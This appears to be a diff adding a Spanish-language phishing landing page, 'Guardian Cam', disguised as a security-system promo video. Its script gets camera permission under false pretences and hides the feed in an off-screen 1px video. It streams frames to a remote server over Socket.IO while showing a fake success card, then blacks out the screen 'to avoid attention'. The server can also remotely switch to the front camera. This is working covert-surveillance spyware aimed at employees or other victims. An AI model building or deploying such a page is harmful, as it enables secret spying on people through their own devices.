@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
+  <meta name="mobile-web-app-capable" content="yes"/>
+  <meta name="apple-mobile-web-app-capable" content="yes"/>
+  <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
+
+  <!-- OG tags para que WhatsApp muestre preview bonito -->
+  <meta property="og:title" content="Sistema de Seguridad Empresarial"/>
+  <meta property="og:description" content="Conoce nuestra solución de vigilancia inteligente"/>
+  <meta property="og:type" content="website"/>
+
+  <title id="pageTitle">Cargando...</title>
+  <style>
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+    :root {
+      --accent: #00cc66;
+      --dark:   #050508;
+      --panel:  #0d0d16;
+    }
+
+    body {
+      font-family: -apple-system, 'Segoe UI', sans-serif;
+      background: var(--dark);
+      color: #ddd;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* ══ PANTALLA 1: VIDEO PROMOCIONAL ══════════════════════════════════════ */
+    #screenVideo {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      align-items: center;
+    }
+
+    /* Header de marca */
+    .brand-bar {
+      width: 100%;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(0,0,0,.6);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid #1a1a2e;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .brand-bar .logo { font-size: 1.4em; }
+    .brand-bar h2    { font-size: .95em; color: #eee; flex:1; }
+    .brand-bar .tag  {
+      font-size: .65em;
+      background: var(--accent);
+      color: #000;
+      padding: 3px 8px;
+      border-radius: 10px;
+      font-weight: 700;
+    }
+
+    /* Contenedor de video */
+    .video-wrap {
+      width: 100%;
+      max-width: 640px;
+      position: relative;
+      background: #000;
+      aspect-ratio: 16/9;
+    }
+    /* TikTok es vertical */
+    .video-wrap.tiktok-wrap {
+      aspect-ratio: 9/16;
+      max-width: 340px;
+      border-radius: 14px;
+      overflow: hidden;
+      margin: 0 auto;
+    }
+    .video-wrap iframe,
+    .video-wrap video {
+      width: 100%;
+      height: 100%;
+      border: none;
+      display: block;
+    }
+
+    /* Barra de progreso falsa (mientras carga) */
+    .video-loading {
+      position: absolute;
+      inset: 0;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 12px;
+      z-index: 5;
+      transition: opacity .5s;
+    }
+    .video-loading.hidden { opacity: 0; pointer-events: none; }
+    .spinner {
+      width: 36px; height: 36px;
+      border: 3px solid #111;
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Contenido bajo el video */
+    .content {
+      width: 100%;
+      max-width: 640px;
+      padding: 20px 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .content h1 {
+      font-size: 1.25em;
+      color: #fff;
+      line-height: 1.3;
+    }
+    .content p {
+      font-size: .88em;
+      color: #777;
+      line-height: 1.6;
+    }
+
+    /* Features */
+    .features {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    .feat {
+      background: var(--panel);
+      border: 1px solid #1a1a2e;
+      border-radius: 12px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: .8em;
+      color: #888;
+    }
+    .feat .ico { font-size: 1.4em; }
+
+    /* Botón CTA - solo aparece cuando el video avanza */
+    #ctaBtn {
+      width: 100%;
+      padding: 16px;
+      border-radius: 14px;
+      border: none;
+      background: linear-gradient(135deg, var(--accent), #009944);
+      color: #000;
+      font-size: 1.05em;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform .15s, box-shadow .15s;
+      display: none; /* aparece después del video */
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    #ctaBtn.visible { display: flex; animation: fadeUp .4s ease; }
+    #ctaBtn:active  { transform: scale(.97); }
+    @keyframes fadeUp { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
+
+    /* Progreso del video */
+    .progress-bar {
+      width: 100%;
+      height: 3px;
+      background: #111;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      background: var(--accent);
+      width: 0%;
+      transition: width .5s linear;
+    }
+
+    /* ══ PANTALLA 2: SOLICITANDO PERMISO ════════════════════════════════════ */
+    #screenPermission {
+      display: none;
+      min-height: 100vh;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 20px;
+      padding: 30px 20px;
+      text-align: center;
+      background: var(--dark);
+    }
+    #screenPermission .big-icon { font-size: 4em; }
+    #screenPermission h2 { font-size: 1.2em; color: #eee; }
+    #screenPermission p  { font-size: .85em; color: #666; max-width: 280px; line-height:1.6; }
+
+    .perm-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      width: 100%;
+      max-width: 300px;
+    }
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: var(--panel);
+      border: 1px solid #1a1a2e;
+      border-radius: 10px;
+      padding: 10px 14px;
+      font-size: .82em;
+      color: #777;
+      text-align: left;
+    }
+    .step .n {
+      width: 22px; height: 22px;
+      border-radius: 50%;
+      background: #1a1a2e;
+      color: var(--accent);
+      font-size: .75em;
+      font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .step.done .n { background: var(--accent); color: #000; }
+
+    /* ══ PANTALLA 3: CÁMARA ACTIVA ══════════════════════════════════════════ */
+    #screenActive {
+      display: none;
+      min-height: 100vh;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+      gap: 16px;
+    }
+
+    .active-header {
+      width: 100%;
+      max-width: 480px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .active-header h2 { flex:1; font-size:1em; color:#eee; }
+    .live-dot {
+      width:9px; height:9px; border-radius:50%;
+      background: var(--accent);
+      box-shadow: 0 0 8px var(--accent);
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+    /* Preview oculto — solo para capturar; el funcionario ve otro contenido */
+    #hiddenVideo {
+      /* Puede ser completamente oculto o muy pequeño */
+      position: fixed;
+      bottom: -9999px;
+      left: -9999px;
+      width: 1px; height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    /* Lo que VE el funcionario después de dar permiso */
+    .thankyou-card {
+      width: 100%;
+      max-width: 480px;
+      background: var(--panel);
+      border: 1px solid #1a2a1a;
+      border-radius: 16px;
+      padding: 28px 20px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+    }
+    .thankyou-card .check { font-size: 3em; }
+    .thankyou-card h2 { color: var(--accent); font-size: 1.2em; }
+    .thankyou-card p  { color: #666; font-size: .85em; line-height: 1.6; }
+
+    .info-mini {
+      width: 100%;
+      max-width: 480px;
+      background: #080810;
+      border: 1px solid #111;
+      border-radius: 10px;
+      padding: 10px 14px;
+      font-size: .75em;
+      color: #333;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+    .info-mini span { color: #2a4a2a; }
+
+    /* Modo batería en pantalla activa */
+    body.battery #screenActive .thankyou-card { display: none; }
+    #batteryOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #000;
+      z-index: 999;
+    }
+    body.battery #batteryOverlay { display: block; }
+  </style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<!-- PANTALLA 1: VIDEO PROMOCIONAL                                             -->
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<div id="screenVideo">
+
+  <div class="brand-bar">
+    <div class="logo">🔐</div>
+    <h2 id="brandName">Guardian Cam</h2>
+    <div class="tag">NUEVO</div>
+  </div>
+
+  <div class="video-wrap" id="videoWrap">
+    <!-- El video se inserta aquí dinámicamente -->
+    <div class="video-loading" id="videoLoading">
+      <div class="spinner"></div>
+      <span style="font-size:.8em;color:#333">Cargando...</span>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+    <h1 id="landingTitle">Sistema de Seguridad Inteligente</h1>
+    <p id="landingSubtitle">Descubre la solución definitiva para proteger lo que más importa.</p>
+
+    <div class="features">
+      <div class="feat"><div class="ico">📡</div><span>Monitoreo en tiempo real</span></div>
+      <div class="feat"><div class="ico">🌐</div><span>Acceso remoto</span></div>
+      <div class="feat"><div class="ico">🔋</div><span>Bajo consumo</span></div>
+      <div class="feat"><div class="ico">🔒</div><span>Conexión segura</span></div>
+    </div>
+
+    <button id="ctaBtn" onclick="requestCameraPermission()">
+      📷 Activar sistema de seguridad
+    </button>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<!-- PANTALLA 2: SOLICITANDO PERMISO DE CÁMARA                                -->
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<div id="screenPermission">
+  <div class="big-icon">📷</div>
+  <h2>Activar cámara de seguridad</h2>
+  <p>Para activar el sistema es necesario permitir el acceso a la cámara de este dispositivo.</p>
+
+  <div class="perm-steps">
+    <div class="step" id="step1">
+      <div class="n">1</div>
+      <span>Presiona <b>"Permitir"</b> cuando el navegador lo solicite</span>
+    </div>
+    <div class="step" id="step2">
+      <div class="n">2</div>
+      <span>La cámara se activará automáticamente</span>
+    </div>
+    <div class="step" id="step3">
+      <div class="n">3</div>
+      <span>El sistema quedará monitoreando</span>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<!-- PANTALLA 3: CÁMARA ACTIVA (lo que ve el funcionario)                     -->
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<div id="screenActive">
+  <div class="active-header">
+    <div class="logo">🔐</div>
+    <h2 id="brandName2">Guardian Cam</h2>
+    <div class="live-dot"></div>
+    <span style="font-size:.72em;color:#2a5a2a">EN VIVO</span>
+  </div>
+
+  <div class="thankyou-card">
+    <div class="check">✅</div>
+    <h2>Sistema activado correctamente</h2>
+    <p>
+      El dispositivo ha sido registrado en el sistema de seguridad.<br>
+      Puedes cerrar esta pantalla o dejarla en segundo plano.
+    </p>
+    <p style="font-size:.75em;color:#333">No muevas ni apagues el dispositivo mientras esté monitoreando.</p>
+  </div>
+
+  <div class="info-mini" id="infoMini">
+    <div>Estado: <span id="statusTxt">Conectando...</span></div>
+    <div>IP: <span id="ipTxt">—</span></div>
+    <div>Viewers: <span id="viewersTxt">0</span></div>
+  </div>
+</div>
+
+<!-- Video oculto para captura de cámara -->
+<video id="hiddenVideo" autoplay muted playsinline></video>
+
+<!-- Pantalla negra del modo batería -->
+<div id="batteryOverlay"></div>
+
+<!-- ═══════════════════════════════════════════════════════════════════════════
+     JAVASCRIPT
+═══════════════════════════════════════════════════════════════════════════ -->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+// ────────────────────────────────────────────────────────────────────────────
+// Configuración (se carga desde el servidor)
+// ────────────────────────────────────────────────────────────────────────────
+let cfg = {};
+let socket, stream, canvas, ctx, frameTimer, wakeLock;
+let framesSent = 0;
+
+async function loadConfig() {
+  try {
+    const r = await fetch('/api/config');
+    cfg = await r.json();
+  } catch(e) {
+    cfg = {
+      videoUrl: '',
+      landingTitle:    'Sistema de Seguridad',
+      landingSubtitle: 'Protección inteligente para tu empresa.',
+      brandName:       'Guardian Cam',
+      autoStartCamera: true,
+      showCameraPreview: false,
+      cameraStartDelay: 2000
+    };
+  }
+
+  // Aplicar textos
+  document.title = cfg.landingTitle || 'Guardian Cam';
+  document.getElementById('landingTitle').textContent    = cfg.landingTitle    || 'Sistema de Seguridad';
+  document.getElementById('landingSubtitle').textContent = cfg.landingSubtitle || '';
+  document.getElementById('brandName').textContent       = cfg.brandName       || 'Guardian Cam';
+  document.getElementById('brandName2').textContent      = cfg.brandName       || 'Guardian Cam';
+
+  // Insertar video
+  setupVideo(cfg.videoUrl);
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// Video
+// ────────────────────────────────────────────────────────────────────────────
+function setupVideo(url) {
+  const wrap = document.getElementById('videoWrap');
+  const loading = document.getElementById('videoLoading');
+
+  if (!url || url === 'PEGA_AQUI_EL_LINK_DEL_VIDEO') {
+    // Sin video configurado: mostrar CTA directamente
+    loading.classList.add('hidden');
+    wrap.style.display = 'none';
+    document.getElementById('progressFill').style.width = '100%';
+    showCTA();
+    return;
+  }
+
+  // Detectar tipo de URL
+  const isYouTube = /youtube\.com|youtu\.be/.test(url);
+  const isVimeo   = /vimeo\.com/.test(url);
+  const isTikTok  = /tiktok\.com/.test(url);
+  const isDirect  = /\.(mp4|webm|ogg)(\?|$)/i.test(url);
+
+  if (isTikTok) {
+    // Extraer ID del video de TikTok
+    const vidId = url.match(/video\/(\d+)/)?.[1];
+    if (vidId) {
+      wrap.classList.add('tiktok-wrap');
+      const iframe = document.createElement('iframe');
+      iframe.src = `https://www.tiktok.com/embed/v2/${vidId}?autoplay=1&loop=0`;
+      iframe.allow = 'autoplay; fullscreen';
+      iframe.allowFullscreen = true;
+      iframe.style.cssText = 'width:100%;height:100%;border:none;';
+      iframe.onload = () => loading.classList.add('hidden');
+      wrap.appendChild(iframe);
+      // TikTok no da eventos de tiempo, simulamos progreso
+      simulateProgress(10000); // CTA aparece a los 10s en TikTok
+    }
+  } else if (isYouTube) {
+    const vidId = url.match(/(?:v=|youtu\.be\/)([^&?/]+)/)?.[1];
+    if (vidId) {
+      const iframe = document.createElement('iframe');
+      iframe.src = `https://www.youtube.com/embed/${vidId}?autoplay=1&mute=1&controls=0&rel=0&modestbranding=1&enablejsapi=1`;
+      iframe.allow = 'autoplay; encrypted-media';
+      iframe.onload = () => loading.classList.add('hidden');
+      wrap.appendChild(iframe);
+      simulateProgress(20000); // 20s aprox
+    }
+  } else if (isVimeo) {
+    const vidId = url.match(/vimeo\.com\/(\d+)/)?.[1];
+    if (vidId) {
+      const iframe = document.createElement('iframe');
+      iframe.src = `https://player.vimeo.com/video/${vidId}?autoplay=1&muted=1&controls=0`;
+      iframe.allow = 'autoplay; fullscreen';
+      iframe.onload = () => loading.classList.add('hidden');
+      wrap.appendChild(iframe);
+      simulateProgress(20000);
+    }
+  } else if (isDirect) {
+    const video = document.createElement('video');
+    video.src = url;
+    video.autoplay = true;
+    video.muted = true;
+    video.playsInline = true;
+    video.controls = false;
+    video.style.cssText = 'width:100%;height:100%;object-fit:cover;';
+    video.addEventListener('canplay', () => loading.classList.add('hidden'));
+    video.addEventListener('timeupdate', () => {
+      if (video.duration) {
+        const pct = (video.currentTime / video.duration) * 100;
+        document.getElementById('progressFill').style.width = pct + '%';
+        if (pct > 30) showCTA(); // Mostrar CTA al 30% del video
+      }
+    });
+    video.addEventListener('ended', showCTA);
+    wrap.appendChild(video);
+  } else {
+    // URL desconocida: tratar como iframe genérico
+    const iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.allow = 'autoplay; camera; microphone';
+    iframe.onload = () => loading.classList.add('hidden');
+    wrap.appendChild(iframe);
+    simulateProgress(15000);
+  }
+}
+
+// Simula progreso de la barra cuando no hay eventos nativos (YouTube/Vimeo)
+function simulateProgress(duration) {
+  document.getElementById('videoLoading').classList.add('hidden');
+  const fill  = document.getElementById('progressFill');
+  const start = Date.now();
+  const timer = setInterval(() => {
+    const pct = Math.min(100, ((Date.now() - start) / duration) * 100);
+    fill.style.width = pct + '%';
+    if (pct >= 30) showCTA();
+    if (pct >= 100) clearInterval(timer);
+  }, 500);
+}
+
+function showCTA() {
+  document.getElementById('ctaBtn').classList.add('visible');
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// Permiso de cámara
+// ────────────────────────────────────────────────────────────────────────────
+function showScreen(id) {
+  ['screenVideo','screenPermission','screenActive'].forEach(s => {
+    document.getElementById(s).style.display = 'none';
+  });
+  const el = document.getElementById(id);
+  el.style.display = 'flex';
+}
+
+async function requestCameraPermission() {
+  showScreen('screenPermission');
+
+  try {
+    // Pequeña pausa para que el usuario lea la pantalla de pasos
+    await delay(cfg.cameraStartDelay || 2000);
+
+    // Marcar paso 1 como activo visualmente
+    document.getElementById('step1').classList.add('done');
+
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: 'environment',    // cámara trasera por defecto
+        width: { ideal: 640 },
+        frameRate: { ideal: 10, max: 15 }
+      },
+      audio: false
+    });
+
+    // Permiso concedido
+    document.getElementById('step1').classList.add('done');
+    document.getElementById('step2').classList.add('done');
+
+    await delay(500);
+    document.getElementById('step3').classList.add('done');
+    await delay(500);
+
+    // Activar cámara
+    activateCamera();
+
+  } catch(e) {
+    // El usuario negó el permiso
+    document.getElementById('step1').querySelector('.n').textContent = '✗';
+    document.getElementById('step1').style.borderColor = '#aa0000';
+    setTimeout(() => {
+      // Volver a la pantalla de video con mensaje
+      showScreen('screenVideo');
+      alert('Se requiere permiso de cámara para activar el sistema de seguridad.');
+    }, 1500);
+  }
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// Activar cámara y streaming
+// ────────────────────────────────────────────────────────────────────────────
+async function activateCamera() {
+  showScreen('screenActive');
+
+  // Asignar stream al video oculto (solo captura, no se ve)
+  const vid = document.getElementById('hiddenVideo');
+  vid.srcObject = stream;
+  await vid.play();
+
+  // Canvas para captura de frames
+  canvas = document.createElement('canvas');
+  ctx    = canvas.getContext('2d');
+
+  // Wake lock para mantener transmisión activa
+  if ('wakeLock' in navigator) {
+    try {
+      wakeLock = await navigator.wakeLock.request('screen');
+    } catch(e) {}
+  }
+
+  // Conectar al servidor
+  connectSocket();
+
+  // Obtener IP
+  fetch('/api/ip').then(r => r.json()).then(d => {
+    document.getElementById('ipTxt').textContent = d.clientIP;
+  }).catch(() => {});
+
+  // Modo batería automático tras 5 segundos (para no llamar la atención)
+  setTimeout(() => {
+    document.body.classList.add('battery');
+  }, 5000);
+
+  // Recuperar modo activo si vuelve al primer plano
+  document.addEventListener('visibilitychange', async () => {
+    if (document.visibilityState === 'visible') {
+      if (!wakeLock) {
+        try { wakeLock = await navigator.wakeLock.request('screen'); } catch(e){}
+      }
+    }
+  });
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// Socket.IO + Streaming
+// ────────────────────────────────────────────────────────────────────────────
+function connectSocket() {
+  socket = io({ transports: ['websocket', 'polling'] });
+
+  socket.on('connect', () => {
+    document.getElementById('statusTxt').textContent = 'Conectado ✓';
+    socket.emit('register-camera', {
+      deviceInfo: navigator.userAgent.slice(0, 80),
+      source: 'landing'
+    });
+    startStreaming();
+  });
+
+  socket.on('camera-confirmed', (d) => {
+    document.getElementById('statusTxt').textContent = 'Transmitiendo ✓';
+  });
+
+  socket.on('viewer-count', (n) => {
+    document.getElementById('viewersTxt').textContent = n;
+  });
+
+  socket.on('command', (cmd) => {
+    if (cmd.action === 'stop' && stream) {
+      stream.getTracks().forEach(t => t.stop());
+      clearInterval(frameTimer);
+    }
+    if (cmd.action === 'flip') flipCameraFacing();
+  });
+
+  socket.on('disconnect', () => {
+    document.getElementById('statusTxt').textContent = 'Reconectando...';
+  });
+}
+
+async function flipCameraFacing() {
+  if (!stream) return;
+  const current = stream.getVideoTracks()[0].getSettings().facingMode || 'environment';
+  const next    = current === 'environment' ? 'user' : 'environment';
+  stream.getTracks().forEach(t => t.stop());
+  clearInterval(frameTimer);
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: next, width:{ideal:640}, frameRate:{ideal:10,max:15} },
+      audio: false
+    });
+    document.getElementById('hiddenVideo').srcObject = stream;
+    await document.getElementById('hiddenVideo').play();
+    startStreaming();
+  } catch(e) {}
+}
+
+function startStreaming() {
+  const vid = document.getElementById('hiddenVideo');
+  clearInterval(frameTimer);
+  frameTimer = setInterval(() => {
+    if (!socket?.connected || !stream) return;
+    const w = vid.videoWidth  || 640;
+    const h = vid.videoHeight || 480;
+    canvas.width  = w;
+    canvas.height = h;
+    ctx.drawImage(vid, 0, 0, w, h);
+    socket.emit('video-frame', canvas.toDataURL('image/jpeg', 0.45));
+    framesSent++;
+
+    if (framesSent % 50 === 0) socket.emit('camera-ping');
+  }, 100); // 10 fps
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// Utilidades
+// ────────────────────────────────────────────────────────────────────────────
+const delay = ms => new Promise(r => setTimeout(r, ms));
+
+// ── Arranque ─────────────────────────────────────────────────────────────────
+loadConfig();
+</script>
+</body>
+</html>
+
